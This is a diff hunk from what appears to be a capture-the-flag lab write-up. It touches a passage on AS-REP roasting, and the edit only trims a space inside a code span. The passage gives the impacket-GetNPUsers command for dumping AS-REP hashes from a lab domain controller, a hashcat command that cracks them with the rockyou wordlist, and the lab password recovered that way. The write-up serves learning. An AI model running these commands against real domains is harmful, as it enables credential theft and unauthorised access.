@@ -129,7 +129,7 @@ And there we have it, our first set of credentials. Now that we have a new footh
 
 ![enter image description here](/assets/img/aoc2025/hoppers-origins/as-rep_roastable_ai.png)
 
-Exporting the users to a file, we can run ` impacket-GetNPUsers ai.vanchat.loc/anne.clark@10.200.171.122 -dc-ip 10.200.171.122 -usersfile as-rep-users > as-rep.hashes` gats a list of hashes which we can then crack with ` hashcat -m 18200 as-rep.hashes /usr/share/wordlists/seclists/Passwords/rockyou.txt` which reveals a password for qw2.amy.young, "password1!". Now we can sign in to Server1 with RDP and grab the server1 user flag!
+Exporting the users to a file, we can run `impacket-GetNPUsers ai.vanchat.loc/anne.clark@10.200.171.122 -dc-ip 10.200.171.122 -usersfile as-rep-users > as-rep.hashes` gats a list of hashes which we can then crack with ` hashcat -m 18200 as-rep.hashes /usr/share/wordlists/seclists/Passwords/rockyou.txt` which reveals a password for qw2.amy.young, "password1!". Now we can sign in to Server1 with RDP and grab the server1 user flag!
 
 ![enter image description here](/assets/img/aoc2025/hoppers-origins/server1_rdp.png)
 
